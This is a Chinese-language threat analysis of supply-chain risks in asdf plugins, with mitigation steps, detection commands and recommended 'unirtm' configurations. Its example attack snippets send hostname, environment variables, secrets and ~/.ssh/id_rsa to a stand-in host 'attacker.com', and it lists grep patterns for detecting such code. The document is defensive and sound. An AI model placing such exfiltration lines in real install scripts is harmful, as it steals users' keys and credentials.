# asdf 供应链攻击风险分析

## 概述

asdf 是一个流行的多语言版本管理工具，但其插件架构存在显著的供应链安全风险。本文档分析这些风险并提供缓解建议。

## 主要风险点

### 1. 社区维护的 Bash 脚本

**风险描述**：

- asdf 插件本质上是**未经审核的 Bash 脚本**
- 这些脚本在你的机器上以**你的用户权限**执行
- 可以访问文件系统、环境变量、网络等所有资源

**攻击向量**：

```bash
# 插件的 bin/install 脚本示例（恶意）
#!/usr/bin/env bash

# 正常的安装逻辑
download_and_install_tool

# 恶意代码（隐藏在正常代码中）
curl -s https://attacker.com/collect \
  -d "hostname=$(hostname)" \
  -d "user=$(whoami)" \
  -d "env=$(env | base64)" \
  -d "ssh_keys=$(cat ~/.ssh/id_rsa 2>/dev/null | base64)"
```

### 2. 插件仓库可被接管

**风险描述**：

- 插件托管在独立的 GitHub 仓库
- 维护者账户可能被攻击者接管
- 插件可能被放弃或删除

**真实案例参考**：
根据 [GitHub Issue #612](https://github.com/asdf-vm/asdf-plugins/issues/612)：
> "Having the official plugins in such a fashion can be very insecure as the repositories can be exposed to bad actors, either with the consent of the plugin maintainers or by accident, via faulty reviews or security leaks of said accounts."

**攻击场景**：

1. 攻击者通过钓鱼获取插件维护者的 GitHub 凭证
2. 推送恶意更新到插件仓库
3. 用户运行 `asdf plugin update <plugin>` 或 `asdf install <tool>@<version>`
4. 恶意脚本在用户机器上执行

### 3. 缺乏代码审核机制

**风险描述**：

- asdf 核心团队**不审核**插件代码
- 任何人都可以创建和发布插件
- 没有代码签名或验证机制

**来自 StackOverflow 的确认**：
> "asdf plugins are never included in asdf-vm core. When you install asdf on a machine it by default includes no plugins. All plugins are installed manually from an external source."

这意味着：

- ❌ 没有中心化的安全审核
- ❌ 没有插件质量保证
- ❌ 没有恶意代码检测

### 4. 依赖链攻击

**风险描述**：
插件脚本可能：

- 下载并执行其他脚本
- 依赖外部工具（curl, wget, tar 等）
- 从不受信任的源下载二进制文件

**示例攻击**：

```bash
# 插件脚本可能做的事情
curl -sL https://untrusted-mirror.com/tool.tar.gz | tar xz
# 如果 untrusted-mirror.com 被攻击者控制，可以注入恶意代码
```

### 5. 环境变量泄露

**风险描述**：

- 插件脚本可以读取所有环境变量
- 可能包含敏感信息（API keys, tokens, passwords）

**风险代码示例**：

```bash
# 恶意插件可以轻易窃取环境变量
env | grep -E '(API|TOKEN|KEY|PASSWORD|SECRET)' | \
  curl -X POST https://attacker.com/steal -d @-
```

## 历史攻击案例（类似场景）

虽然没有公开的 asdf 特定攻击案例，但类似的供应链攻击已经发生：

### 1. npm 包攻击

- **event-stream 事件** (2018)：流行的 npm 包被注入恶意代码，窃取加密货币钱包
- **ua-parser-js 事件** (2021)：每周 600 万下载的包被注入挖矿和密码窃取代码

### 2. PyPI 包攻击

- **ctx 包事件** (2022)：流行的 Python 包被注入窃取 AWS 凭证的代码

### 3. WordPress 插件攻击

- **2024 年供应链攻击**：20+ 个插件被恶意方收购并植入后门

### 4. Nx Build System 攻击

- **2025 年 AI 武器化攻击**：攻击者利用 AI 工具窃取数千个开发者凭证

## asdf 的具体风险评估

| 风险因素 | 风险等级 | 说明 |
|---------|---------|------|
| 代码执行权限 | 🔴 高 | Bash 脚本以用户权限执行 |
| 代码审核 | 🔴 高 | 无中心化审核机制 |
| 账户接管 | 🟡 中 | 依赖插件维护者的账户安全 |
| 供应链透明度 | 🟡 中 | 可以查看源码，但需要手动审核 |
| 更新机制 | 🟡 中 | 自动更新可能引入恶意代码 |
| 依赖验证 | 🔴 高 | 下载的二进制文件通常无签名验证 |

## 缓解措施

### 1. 最小化使用（推荐）

**策略**：仅在必要时使用 asdf，优先使用更安全的替代方案

```toml
# .unirtm.toml - 优先级顺序
# 1. 内置后端（最安全）
node = "25.9.0"
python = "3.14.3"
go = "1.26.2"

# 2. GitHub Releases（较安全）
"github:cli/cli" = "2.89.0"

# 3. 包管理器（较安全）
"npm:prettier" = "3.8.1"
"cargo:ripgrep" = "14.1.0"

# 4. asdf（最后选择）
# 仅在没有其他选择时使用
```

### 2. 审核插件代码

**在安装前**：

```bash
# 1. 查看插件仓库
asdf plugin list all | grep <plugin-name>

# 2. 克隆并审核代码
git clone <plugin-repo-url>
cd <plugin-repo>

# 3. 检查关键脚本
cat bin/install
cat bin/download
cat bin/list-all

# 4. 查找可疑模式
grep -r "curl.*|.*sh" .
grep -r "eval" .
grep -r "base64" .
```

### 3. 使用可信插件

**优先使用**：

- asdf-community 组织维护的插件
- 官方语言团队维护的插件
- 有大量 stars 和活跃维护的插件

**检查清单**：

- ✅ 仓库有多个维护者
- ✅ 最近有活跃的提交
- ✅ 有 CI/CD 测试
- ✅ 代码简洁易读
- ❌ 避免使用个人维护的小众插件

### 4. 锁定插件版本

```bash
# 不要自动更新插件
# asdf plugin update --all  # ❌ 危险

# 手动更新并审核变更
git -C ~/.asdf/plugins/<plugin> fetch
git -C ~/.asdf/plugins/<plugin> diff HEAD origin/main
git -C ~/.asdf/plugins/<plugin> pull  # 仅在审核后
```

### 5. 使用沙箱环境

```bash
# 在容器中测试新插件
docker run -it --rm ubuntu:latest bash
# 安装 asdf 和插件
# 观察行为
```

### 6. 监控网络活动

```bash
# 使用 tcpdump 或 wireshark 监控插件安装时的网络活动
sudo tcpdump -i any -n 'host not (localhost or 127.0.0.1)'

# 在另一个终端安装插件
asdf install <tool> <version>
```

### 7. 限制环境变量暴露

```bash
# 在受限环境中运行 asdf
env -i HOME=$HOME PATH=$PATH asdf install <tool> <version>
```

## unirtm 的改进

unirtm (asdf 的 Rust 重写版本) 提供了一些改进：

### 优势

✅ **内置后端**：核心语言（node, python, go）不依赖外部插件
✅ **多种后端**：支持 github:, npm:, cargo: 等更安全的来源
✅ **Rust 实现**：核心代码更安全，性能更好
✅ **可禁用后端**：可以完全禁用 asdf 后端

### 仍存在的风险

⚠️ **兼容 asdf 插件**：为了兼容性，仍然支持 asdf 插件
⚠️ **相同的风险**：使用 asdf 插件时，风险完全相同

## 推荐配置

### 高安全环境（生产、CI/CD）

```toml
# .unirtm.toml
[settings]
# 完全禁用 asdf 和 aqua
disable_backends = ["asdf", "aqua"]

[tools]
# 仅使用内置和 GitHub releases
node = "25.9.0"
python = "3.14.3"
"github:cli/cli" = "2.89.0"
```

### 平衡环境（开发）

```toml
# .unirtm.toml
[settings]
# 禁用 aqua，保留 asdf 但谨慎使用
disable_backends = ["aqua"]

[tools]
# 优先使用安全来源
node = "25.9.0"
"github:cli/cli" = "2.89.0"

# 仅在必要时使用 asdf（已审核的插件）
# "asdf:tool" = "version"  # 仅在审核后取消注释
```

## 检测清单

定期检查是否存在可疑活动：

```bash
# 1. 检查最近修改的插件
find ~/.asdf/plugins -type f -mtime -7 -ls

# 2. 检查插件中的可疑模式
for plugin in ~/.asdf/plugins/*; do
  echo "Checking $plugin..."
  grep -r "curl.*|.*sh" "$plugin" 2>/dev/null
  grep -r "eval.*\$" "$plugin" 2>/dev/null
  grep -r "base64.*-d" "$plugin" 2>/dev/null
done

# 3. 检查异常的网络连接
lsof -i -P | grep asdf

# 4. 检查环境变量访问
grep -r "printenv\|env\|export" ~/.asdf/plugins/*/bin/
```

## 结论

asdf 插件系统存在**真实且显著的供应链攻击风险**：

1. ✅ **风险是真实的**：Bash 脚本可以做任何事情
2. ✅ **已有先例**：类似的供应链攻击频繁发生
3. ✅ **缺乏防护**：没有内置的安全机制
4. ⚠️ **但可以缓解**：通过审核、限制使用、监控等措施

**建议**：

- 🔴 **生产环境**：完全禁用 asdf
- 🟡 **开发环境**：谨慎使用，仅使用可信插件
- 🟢 **个人项目**：可以使用，但要了解风险

## 参考资料

1. [asdf-plugins Issue #612 - Security Concerns](https://github.com/asdf-vm/asdf-plugins/issues/612)
2. [Shell Scripting Supply Chain Security](https://hoop.dev/blog/shell-scripting-supply-chain-security-safeguard-your-software-pipeline/)
3. [Supply Chain Attacks - Mozilla](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Supply_chain_attacks)
4. [WordPress Supply Chain Attack 2024](https://www.wordfence.com/blog/2024/07/the-aftermath-of-the-wordpress-org-supply-chain-attack-new-malware-and-techniques-emerge/)
5. [Nx Supply Chain Breach](https://www.ox.security/blog/nx-supply-chain-breach-how-s1ngularity-weaponized-ai/)

## 更新日志

- 2026-04-15: 初始版本，详细分析 asdf 供应链风险
